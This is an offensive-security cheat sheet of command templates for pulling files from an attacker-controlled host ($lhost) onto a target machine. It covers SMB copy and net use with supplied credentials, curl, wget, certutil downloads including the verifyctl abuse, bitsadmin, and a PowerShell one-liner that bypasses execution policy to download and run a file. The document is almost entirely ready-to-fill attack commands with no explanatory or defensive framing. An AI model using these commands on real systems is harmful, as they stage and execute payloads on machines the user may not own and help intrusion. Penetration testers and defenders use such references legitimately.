# File_download

## File download SMB

### SMB copy no creds

Download SMB copy no creds with File_download.

```sh title:"File Download Download SMB Copy No Creds"
copy '\\\$lhost\\$share\\$file'
```
<!-- cheat
import passwords
import users
import tun_ip
var share
var file
-->

### SMB copy with creds

Download SMB copy with creds with File_download.

```sh title:"File Download Download SMB Copy with Creds"
copy '\\\$lhost\\$share\\$file' /user:$user $pass
```
<!-- cheat
import passwords
import users
import tun_ip
var share
var file
-->

### Net use mount no creds

Download net use mount no creds with File_download.

```sh title:"File Download Download Net Use Mount No Creds"
net use n: '\\\$lhost\\$share' # then: copy n:\file.txt
```
<!-- cheat
import passwords
import users
import tun_ip
var share
-->

### Net use mount with creds

Download net use mount with creds with File_download.

```sh title:"File Download Download Net Use Mount with Creds"
net use n: '\\\$lhost\\$share' /user:$user $pass # then: copy n:\file.txt
```
<!-- cheat
import passwords
import users
import tun_ip
var share
-->

## File download Web

### Curl download

Download curl download with File_download.

```sh title:"File Download Download Curl Download"
curl $scheme://$lhost:$lport/$file -o $file
```
<!-- cheat
import webserver
import passwords
import users
import tun_ip
import ffuf
import files
import lports
var scheme
-->

### wget download

Download wget download with File_download.

```sh title:"File Download Download Wget Download"
wget $scheme://$lhost:$lport/$file
```
<!-- cheat
import webserver
import passwords
import users
import tun_ip
import ffuf
import files
import lports
var scheme
-->

### CertUtil download (small)

Download CertUtil download (small) with File_download.

```sh title:"File Download Download CertUtil Download (small)"
certutil -urlcache -f $scheme://$lhost:$lport/$file $upload_location_template$file
```
<!-- cheat
import webserver
import passwords
import users
import tun_ip
import ffuf
import files
import lports
var scheme
var upload_location_template
-->

### CertUtil download (large)

Download CertUtil download (large) with File_download.

```sh title:"File Download Download CertUtil Download (large)"
certutil -urlcache -split -f $scheme://$lhost:$lport/$file $upload_location_template$file
```
<!-- cheat
import webserver
import passwords
import users
import tun_ip
import ffuf
import files
import lports
var scheme
var upload_location_template
-->

### BitsAdmin download

Download BitsAdmin download with File_download.

```sh title:"File Download Download BitsAdmin Download"
bitsadmin /transfer job $scheme://$lhost:$lport/$file $upload_location_template$file
```
<!-- cheat
import webserver
import passwords
import users
import tun_ip
import ffuf
import files
import lports
var scheme
var upload_location_template
-->

### CertUtil verifyctl download

Download CertUtil verifyctl download with File_download.

```cmd title:"File Download Download CertUtil Verifyctl Download"
certutil.exe -verifyctl -f -split "$scheme://$lhost:$lport/$file" "$upload_location_template$file"
```
<!-- cheat
import webserver
import passwords
import users
import tun_ip
import files
import lports
var scheme
var upload_location_template
-->

### CertUtil decode base64

Download CertUtil decode base64 with File_download.

```cmd title:"File Download Download CertUtil Decode Base64"
certutil.exe -decode "$encoded_file" "$output_file"
```
<!-- cheat
var encoded_file := enc.txt
var output_file
-->

### PowerShell download

Download PowerShell download with File_download.

```powershell title:"File Download Download PowerShell Download"
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -Command "(New-Object System.Net.WebClient).DownloadFile('$scheme://$lhost:$lport/$file', '$upload_location_template$file')"
```
<!-- cheat
import webserver
import passwords
import users
import tun_ip
import files
import lports
var scheme
var upload_location_template
-->

### PowerShell download and execute

Download PowerShell download and execute with File_download.

```powershell title:"File Download Download PowerShell Download and Execute"
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -Command "(New-Object System.Net.WebClient).DownloadFile('$url', '$output_file'); Start-Process '$output_file'"
```
<!-- cheat
var url
var output_file
-->
